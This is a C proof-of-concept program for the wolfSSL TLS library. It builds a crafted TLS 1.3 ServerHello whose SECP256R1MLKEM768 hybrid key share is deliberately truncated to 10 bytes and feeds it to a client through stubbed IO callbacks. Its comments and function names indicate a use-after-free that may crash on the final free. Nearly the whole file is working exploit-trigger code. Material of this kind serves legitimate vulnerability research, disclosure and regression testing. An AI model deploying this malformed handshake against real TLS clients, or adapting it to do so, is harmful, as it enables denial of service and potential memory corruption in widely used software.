#include <stdio.h>
#include <string.h>

#include <wolfssl/options.h>
#include <wolfssl/ssl.h>
#include <wolfssl/wolfcrypt/types.h>

typedef struct PqcHybridMsg {
    byte* buffer;
    word32 length;
} PqcHybridMsg;

static int PqcHybridUafSend(WOLFSSL* ssl, char* buf, int sz, void* ctx)
{
    (void)ssl;
    (void)buf;
    (void)ctx;
    return sz;
}

static int PqcHybridUafRecv(WOLFSSL* ssl, char* buf, int sz, void* ctx)
{
    PqcHybridMsg* msg = (PqcHybridMsg*)ctx;
    int len;

    (void)ssl;

    if (msg == NULL || msg->buffer == NULL || msg->length == 0)
        return WOLFSSL_CBIO_ERR_WANT_READ;

    len = (int)msg->length;
    if (len > sz)
        len = sz;

    XMEMCPY(buf, msg->buffer, len);
    msg->buffer += len;
    msg->length -= (word32)len;

    return len;
}

int main(void)
{
#if defined(WOLFSSL_TLS13) && !defined(NO_WOLFSSL_CLIENT) && \
    defined(WOLFSSL_HAVE_MLKEM) && defined(WOLFSSL_PQC_HYBRIDS) && \
    !defined(WOLFSSL_NO_ML_KEM_768) && defined(HAVE_ECC) && \
    !defined(WOLFSSL_MLKEM_NO_DECAPSULATE) && \
    !defined(WOLFSSL_MLKEM_NO_MAKE_KEY)

    WOLFSSL_CTX* ctx = NULL;
    WOLFSSL* ssl = NULL;
    int ret;
    PqcHybridMsg msg;

    /*
     * Crafted TLS 1.3 ServerHello with SECP256R1MLKEM768 (0x11EB).
     * The key_share extension contains only 10 bytes of key_exchange data,
     * while the real hybrid key share is expected to be about 1120+ bytes.
     */
    static byte serverHello[] = {
        /* TLS record: Handshake, TLS 1.2 compat, length 68 */
        0x16, 0x03, 0x03, 0x00, 0x44,
        /* Handshake: ServerHello, length 64 */
        0x02, 0x00, 0x00, 0x40,
        /* legacy_version */
        0x03, 0x03,
        /* random */
        0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
        0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
        0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
        0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
        /* legacy_session_id_echo length */
        0x00,
        /* cipher_suite: TLS_AES_128_GCM_SHA256 */
        0x13, 0x01,
        /* legacy_compression_method */
        0x00,
        /* extensions length */
        0x00, 0x18,
        /* supported_versions: TLS 1.3 */
        0x00, 0x2b, 0x00, 0x02, 0x03, 0x04,
        /* key_share extension */
        0x00, 0x33,
        0x00, 0x0e,
        /* named_group: SECP256R1MLKEM768 / WOLFSSL_SECP256R1MLKEM768 */
        0x11, 0xeb,
        /* key_exchange length: 10, intentionally truncated */
        0x00, 0x0a,
        0x41, 0x41, 0x41, 0x41, 0x41,
        0x41, 0x41, 0x41, 0x41, 0x41
    };

    fprintf(stderr, "[*] wolfSSL_Init\n");
    ret = wolfSSL_Init();
    fprintf(stderr, "[*] wolfSSL_Init returned: %d\n", ret);

    fprintf(stderr, "[*] creating TLS 1.3 client ctx\n");
    ctx = wolfSSL_CTX_new(wolfTLSv1_3_client_method());
    if (ctx == NULL) {
        fprintf(stderr, "[-] wolfSSL_CTX_new failed\n");
        return 2;
    }

    wolfSSL_SetIORecv(ctx, PqcHybridUafRecv);
    wolfSSL_SetIOSend(ctx, PqcHybridUafSend);

    fprintf(stderr, "[*] creating ssl\n");
    ssl = wolfSSL_new(ctx);
    if (ssl == NULL) {
        fprintf(stderr, "[-] wolfSSL_new failed\n");
        wolfSSL_CTX_free(ctx);
        return 3;
    }

    fprintf(stderr, "[*] enabling key share WOLFSSL_SECP256R1MLKEM768\n");
    ret = wolfSSL_UseKeyShare(ssl, WOLFSSL_SECP256R1MLKEM768);
    fprintf(stderr, "[*] wolfSSL_UseKeyShare returned: %d\n", ret);
    if (ret != WOLFSSL_SUCCESS) {
        wolfSSL_free(ssl);
        wolfSSL_CTX_free(ctx);
        return 4;
    }

    msg.buffer = serverHello;
    msg.length = (word32)sizeof(serverHello);
    wolfSSL_SetIOReadCtx(ssl, &msg);

    fprintf(stderr, "[*] crafted ServerHello size: %u\n", (unsigned)sizeof(serverHello));
    fprintf(stderr, "[*] calling wolfSSL_connect_TLSv13\n");

    ret = wolfSSL_connect_TLSv13(ssl);
    fprintf(stderr, "[*] wolfSSL_connect_TLSv13 returned: %d\n", ret);

    fprintf(stderr, "[*] calling wolfSSL_free; vulnerable versions may crash here\n");
    wolfSSL_free(ssl);

    fprintf(stderr, "[*] wolfSSL_free done\n");
    wolfSSL_CTX_free(ctx);
    wolfSSL_Cleanup();

    fprintf(stderr, "[*] cleanup done\n");
    return 0;

#else
    fprintf(stderr, "[-] required build macros not enabled\n");
    fprintf(stderr, "[-] need WOLFSSL_TLS13, WOLFSSL_HAVE_MLKEM, WOLFSSL_PQC_HYBRIDS, HAVE_ECC, ML_KEM_768\n");
    return 77;
#endif
}
